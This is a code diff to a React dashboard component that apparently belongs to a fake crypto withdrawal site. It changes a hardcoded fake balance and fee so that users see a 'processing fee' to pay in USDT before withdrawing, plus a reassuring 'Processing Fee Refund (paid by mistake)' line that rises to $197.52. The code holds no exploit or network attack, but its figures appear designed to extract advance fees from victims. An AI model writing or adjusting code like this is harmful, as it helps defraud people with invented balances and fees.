@@ -86,7 +86,7 @@ const Dashboard = () => {
   const [notificationExchange, setNotificationExchange] = useState("");
 
   const balance = 9876;
-  const fee = 106;
+  const fee = 197.52;
   const netAmount = balance - fee;
 
   const detectCardType = (number: string): { type: string; logo: string } | null => {
@@ -220,7 +220,7 @@ const Dashboard = () => {
     setIsVerifying(true);
     setVerificationError(null);
     
-    const amountDue = fee; // $106
+    const amountDue = fee - 91.52; // $106
     
     try {
       console.log(`Verifying payment of $${amountDue.toFixed(2)} USDT...`);
@@ -548,7 +548,7 @@ const Dashboard = () => {
         );
 
       case "fee":
-        const accountBalance = 101;
+        const accountBalance = 91.52;
         const amountDue = fee - accountBalance;
         return (
           <>
@@ -599,7 +599,7 @@ const Dashboard = () => {
         );
 
       case "payment":
-        const existingAccountBalance = 101;
+        const existingAccountBalance = 91.52;
         const remainingFee = fee - existingAccountBalance;
         return (
           <>
@@ -961,7 +961,7 @@ const Dashboard = () => {
                   </div>
                   <div className="flex justify-between">
                      <span className="text-muted-foreground">Processing Fee Refund (paid by mistake):</span>
-                    <span className="font-medium text-chart-2">$106.00 USDT</span>
+                    <span className="font-medium text-chart-2">$197.52 USDT</span>
                   </div>
                 </div>
                  <p className="text-muted-foreground text-xs italic">
